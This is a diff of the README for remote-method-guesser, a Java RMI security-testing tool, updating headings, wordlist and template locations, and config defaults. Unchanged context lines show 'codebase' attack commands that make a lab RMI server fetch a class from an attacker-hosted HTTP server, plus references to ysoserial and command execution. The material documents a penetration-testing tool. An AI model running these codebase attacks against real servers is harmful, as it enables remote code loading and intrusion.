@@ -459,7 +459,7 @@ The codebase configuration on an *RMI server* can be different for the different
 ``--signature act`` (activator), ``--signature dgc`` (distributed garbage collector) or ``--signature reg`` (rmi registry) together with the
 ``codebase`` action.
 
-**Application Level**
+*Application Level*:
 
 ```console
 [qtc@kali ~]$ rmg 172.17.0.2 9010 codebase Example http://172.17.0.1:8000 --signature "String login(java.util.HashMap dummy1)" --bound-name legacy-service
@@ -478,7 +478,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 172.17.0.2 - - [26/Mar/2021 06:19:24] "GET /44c9f8b49776400eb6d3142a41060c69.class HTTP/1.1" 404 -
 ```
 
-**RMI Registry**
+*RMI Registry*:
 
 ```console
 [qtc@kali ~]$ rmg 172.17.0.2 9010 codebase Example http://172.17.0.1:8000 --signature reg
@@ -494,7 +494,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 172.17.0.2 - - [26/Mar/2021 06:20:47] "GET /Example.class HTTP/1.1" 200 -
 ```
 
-**Distributed Garbage Collector**
+*Distributed Garbage Collector*:
 
 ```console
 [qtc@kali ~]$ rmg 172.17.0.2 9010 codebase Example http://172.17.0.1:8000 --signature reg
@@ -509,7 +509,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 172.17.0.2 - - [26/Mar/2021 06:22:23] "GET /Example.class HTTP/1.1" 200 -
 ```
 
-**Activator**
+*Activator*:
 
 ```console
 [qtc@kali ~]$ rmg 172.17.0.2 9010 codebase Example http://172.17.0.1:8000 --signature act
@@ -579,7 +579,7 @@ For an successful *RMI call* you always need an interface definition and the cod
 The interface file created by *remote-method-guesser* (``IPlainServer.java``) can be compiled right
 away, whereas the actual method call (``execute.java``) contains a ``TODO`` for each method argument.
 
-```java
+```console
 [qtc@kali ~]$ grep -A 5 "TODO" /home/qtc/rmg-samples/plain-server/execute/execute.java
             java.lang.String argument0 = TODO;
 
@@ -612,7 +612,7 @@ command execution. After making this substitution and compiling the two generate
 -----
 
 *remote-method-guesser* guesses *remote methods* based on a wordlist approach. Corresponding wordlists are shipped within this repository and are contained
-within the [wordlist directory](./wordlists). Wordlists are stored using an optimized *rmg-internal* format:
+within the [wordlist directory](./wordlists). Wordlists are stored in an optimized *rmg-internal* format:
 
 ```
 <RETURN_VALUE> <METHODNAME>(<ARGUMENTS>); <METHOD_HASH>; <IS_PRIMITIVE>; <IS_VOID>;
@@ -642,28 +642,28 @@ However, *remote-method-guesser* is also able to process non-optimized wordlists
 ```console
 [qtc@kali wordlists]$ cat custom_wordlist.txt
 boolean example_signature(String test)
-[qtc@kali wordlists]$ rmg --ssl 172.18.0.2 1090 guess
-[+] Connecting to RMI registry... done.
-[+] Obtaining a list of bound names... done.
-[+] 3 names are bound to the registry.
+[qrc@kali ~]$ rmg --ssl --wordlist-folder /opt/remote-method-guesser/wordlists/ 172.17.0.2 1090 guess
 [+] 3 wordlist files found.
 [+] Reading method candidates from file /opt/remote-method-guesser/wordlists/rmg.txt
 [+] 	752 methods were successfully parsed.
-[+] Reading method candidates from file /opt/remote-method-guesser/wordlists/custom_wordlist.txt
+[+] Reading method candidates from file /opt/remote-method-guesser/wordlists/rmiscout.txt
+[+] 	2550 methods were successfully parsed.
+[+] Reading method candidates from file /opt/remote-method-guesser/wordlists/custom-wordlist.txt
 [+] 	1 methods were successfully parsed.
 [...]
 ```
 
-Furthermore, by using the ``--update`` switch during the ``guess`` action, *remote-method-guesser* updates your wordlist to the optimized format:
+By using the ``--update`` switch during the ``guess`` action, *remote-method-guesser* updates your wordlist to the optimized format:
 
 ```console
 [qtc@kali wordlists]$ cat custom_wordlist.txt
 boolean example_signature(String test); -8079561808652318592; false; false
 ```
 
-By default, *remote-method-guesser* expects wordlists to be located at ``/opt/remote-method-guesser/wordlists``. If this configuration does not fit for you,
-you can change the default location within the configuration file. For dynamic changes you can also use the ``--wordlist-file`` and
-``--wordlist-folder`` options.
+Since version ``v3.2.0``, *remote-method-guesser* does no longer use a default wordlist directory, but contains it's default wordlists
+within the *JAR archive*. This allows the *JAR* to work as a standalone without any requirements on the directory structure. However,
+if you want to add a default wordlist directory again, you can still configure it within the [rmg configuration file](#configuration)
+or specify it dynamically using the ``--wordlist-file`` and ``--wordlist-folder`` command line options.
 
 
 ### Template Files
@@ -674,8 +674,12 @@ Template files are used by *remote-method-guesser* for sample generation. They a
 contain all the *Java code* required for sample generation (apart from some placeholders). During the sample generation process,
 *rmg* simply replaces the placeholders with appropriate values for the current *remote method*.
 
-It is generally not recommended to modify the template files, but it is of cause possible if you know what you are doing. However,
-keep in mind that template files should stay generic and that the different placeholders are usually required to guarantee this.
+Since version ``v3.2.0`` *remote-method-guesser* does no longer use a default template directory, but contains it's default templates
+within the *JAR archive*. This allows the *JAR* to work as a standalone without any requirements on the directory structure. However,
+if you want to add a default template directory again, you can still configure it within the [rmg configuration file](#configuration)
+or specify it dynamically using the ``--template-folder`` command line option. That being said, it is generally not recommended to modify
+the template files, but it is of cause possible if you know what you are doing. However, keep in mind that template files should stay generic
+and that the different placeholders are usually required to guarantee this.
 
 As automatically generated sample files contain content that is controlled by the remote server (*bound names*, *class names* and *package names*),
 it is generally a security risk to compile and execute them. *remote-method-guesser* tries to reduce the risk by applying input filtering to
@@ -691,19 +695,19 @@ sample generation. However, this should only be done after verifying that the re
 -----
 
 *remote-method-guesser* provides some command line switches to modify its behavior dynamically, but persistent configuration changes
-are also quite easy to implement. *rmg* uses a [configuration file](./src/config.properties) to obtain default values for certain options,
+are also possible for some options. *rmg* uses a [configuration file](./src/config.properties) to obtain default values for certain options,
 but it also accepts a different configuration file passed using the ``--config`` option. The current default configuration looks like this:
 
 ```properties
-template-folder  = /opt/remote-method-guesser/templates/
-wordlist-folder  = /opt/remote-method-guesser/wordlists/
+template-folder  =
+wordlist-folder  =
 sample-folder    = ./rmg-samples
 wordlist-file    =
 ysoserial-path   = /opt/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar
 threads = 5
 ```
 
-For persistent configuration changes, just apply them to the ``./src/config.properties`` file and rebuild *rmg* as explained above.
+For persistent configuration changes, just apply them to the ``./src/config.properties`` file and rebuild *rmg* as explained [above](#installation).
 You can also create a ``.properties`` file with your own configuration and feed it into *rmg* using the ``--config`` option.
 
 
